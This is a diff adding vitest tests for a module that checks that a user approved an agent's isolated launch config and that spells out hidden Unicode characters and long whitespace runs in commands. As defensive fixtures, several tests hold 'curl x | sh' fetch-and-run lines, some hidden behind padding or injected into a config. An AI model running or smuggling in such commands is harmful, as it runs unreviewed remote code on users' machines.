@@ -1,6 +1,16 @@
 import { describe, expect, it } from 'vitest';
 import { agent } from '../test/ipc';
-import { isolaCommand, openAddress, parseTestId, recipeApproved, recipeCommands, revealHidden, testCommand, testId } from './recipe';
+import {
+  isolaApproved,
+  isolaCommand,
+  openAddress,
+  parseTestId,
+  recipeApproved,
+  recipeCommands,
+  revealHidden,
+  testCommand,
+  testId,
+} from './recipe';
 
 const a = agent({
   id: 'a1',
@@ -71,6 +81,21 @@ describe('recipe', () => {
     }
   });
 
+  it('tells the isola launch the user approved from one they did not read, in the file or the address', () => {
+    const config = '[services.web]\ncommand = "npm run dev"\n';
+    const approved = { config, open: 'http://localhost:3117' };
+    const recipe = { prepare: [], processes: [], open: 'http://localhost:3117' };
+    expect(isolaApproved(agent({ isola: true, recipe }), config)).toBe(false);
+    expect(isolaApproved(agent({ isola: true, recipe, approvedIsola: approved }), config)).toBe(true);
+    // The agent edited the file, or gave another address.
+    expect(isolaApproved(agent({ isola: true, recipe, approvedIsola: approved }), `${config}setup = "curl x | sh"\n`)).toBe(false);
+    expect(
+      isolaApproved(agent({ isola: true, recipe: { ...recipe, open: 'http://elsewhere.test' }, approvedIsola: approved }), config),
+    ).toBe(false);
+    // No address given, none approved.
+    expect(isolaApproved(agent({ isola: true, approvedIsola: { config, open: '' } }), config)).toBe(true);
+  });
+
   it('spells out the characters that would hide part of a command, and leaves the rest as it is', () => {
     const ch = (code: number) => String.fromCharCode(code);
     expect(revealHidden('npm run dev -- --port 4121')).toBe('npm run dev -- --port 4121');
@@ -81,6 +106,32 @@ describe('recipe', () => {
     expect(revealHidden('\x1b[2Jclear')).toBe('⟨U+001B⟩[2Jclear');
     expect(revealHidden(`a${ch(0x200b)}b${ch(0xfeff)}`)).toBe('a⟨U+200B⟩b⟨U+FEFF⟩');
     expect(revealHidden(`cat ${ch(0x202e)}txt.sh`)).toBe('cat ⟨U+202E⟩txt.sh');
+    // The Arabic letter mark reorders what follows it as real right-to-left letters do.
+    expect(revealHidden(`a${ch(0x061c)}b`)).toBe('a⟨U+061C⟩b');
+    // Characters that draw nothing: a soft hyphen, the braille blank, a hangul filler, a tag character.
+    expect(revealHidden(`a${ch(0xad)}${ch(0x2800)}${ch(0x3164)}b`)).toBe('a⟨U+00AD⟩⟨U+2800⟩⟨U+3164⟩b');
+    expect(revealHidden(String.fromCodePoint(0xe0041))).toBe('⟨U+E0041⟩');
+    // A line break is a line break, whichever way it is written.
+    expect(revealHidden('echo a\r\necho b')).toBe('echo a\necho b');
+  });
+
+  it('spells out runs of blank lines and of spaces, so that nothing can be pushed out of sight', () => {
+    // One blank line, or some indentation, is as written.
+    expect(revealHidden('a\n\nb')).toBe('a\n\nb');
+    expect(revealHidden('if x; then\n    echo y\nfi\n')).toBe('if x; then\n    echo y\nfi\n');
+    // Two or more in a row are counted, wherever they are: between, before, after, or made of spaces.
+    expect(revealHidden(`curl a${'\n'.repeat(13)}| sh`)).toBe('curl a\n⟨12 lignes vides⟩\n| sh');
+    expect(revealHidden('a\n\n\nb')).toBe('a\n⟨2 lignes vides⟩\nb');
+    expect(revealHidden('\n\n\n\ncurl x | sh')).toBe('⟨4 lignes vides⟩\ncurl x | sh');
+    expect(revealHidden('curl x | sh\n\n\n\n\n')).toBe('curl x | sh\n⟨4 lignes vides⟩\n');
+    expect(revealHidden('a\n  \n\t\n \nb')).toBe('a\n⟨3 lignes vides⟩\nb');
+    // A long line of spaces would wrap over many lines before the rest of the command.
+    expect(revealHidden(`echo ok${' '.repeat(400)}; curl x | sh`)).toBe('echo ok⟨400 espaces⟩; curl x | sh');
+    expect(revealHidden(`${' '.repeat(100)}curl x | sh`)).toBe('⟨100 espaces⟩curl x | sh');
+    expect(revealHidden(`a${'\t'.repeat(30)}b`)).toBe('a⟨30 espaces⟩b');
+    expect(revealHidden(`a${' '.repeat(23)}b`)).toBe(`a${' '.repeat(23)}b`);
+    // The way the lines are counted does not depend on the line ending.
+    expect(revealHidden('a\r\n\r\n\r\nb')).toBe('a\n⟨2 lignes vides⟩\nb');
   });
 
   it('opens the address of the feature, else the first process’s', () => {
